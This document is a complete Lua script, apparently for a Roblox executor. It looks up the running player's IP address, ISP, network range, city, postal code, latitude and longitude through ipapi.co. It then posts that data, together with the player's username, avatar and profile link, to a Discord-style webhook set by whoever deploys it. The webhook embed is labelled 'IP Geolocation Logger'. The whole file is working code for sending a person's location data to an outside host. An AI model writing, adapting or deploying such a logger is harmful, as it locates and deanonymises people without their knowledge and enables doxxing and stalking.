local httpService = game:GetService("HttpService")
local player = game:GetService("Players").LocalPlayer
local userId = player and player.UserId

local avatarSuccess, avatarUrl = pcall(function()
	return httpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=720x720&format=Png&isCircular=false")).data[1].imageUrl
end)

local geolocationSuccess, geolocationData = pcall(function()
	return httpService:JSONDecode(game:HttpGet("https://ipapi.co/json"))
end)
geolocationData = geolocationSuccess and geolocationData or {}

local function addField(name, value)
	return {
		name = name,
		value = geolocationData[value] and tostring(geolocationData[value]) or "Not Found"
	}
end

local payload = {
	embeds = {
		{
			color = 1733608,
			fields = {
				addField("IP Address", "ip"),
				addField("Network Range", "network"),
				addField("ASN (Autonomous System Number)", "asn"),
				addField("ISP (Internet Service Provider)", "org"),
				addField("Country", "country_name"),
				addField("Region/Province", "region"),
				addField("City", "city"),
				addField("Postal Code", "postal"),
				addField("Latitude", "latitude"),
				addField("Longitude", "longitude"),
				addField("Timezone", "timezone")
			}
		},
		{
			title = "View " .. player.Name .. "'s full profile",
			url = "https://www.roblox.com/users/" .. userId .. "/profile",
			color = 1733608,
			image = {
				url = avatarSuccess and avatarUrl or "https://i.ibb.co.com/mVYFTK2f/Avatar-Not-Found.png"
			}
		}
	},
	username = "IP Geolocation Logger",
	avatar_url = "https://i.ibb.co.com/spwWKyBW/Globe-With-Meridians.png"
}

pcall(function()
	(request or http_request or sync and sync.request or http and http.request)({
		Url = getgenv()["Webhook URL"],
		Method = "POST",
		Body = httpService:JSONEncode(payload),
		Headers = {
			["Content-Type"] = "application/json"
		}
	})
end)
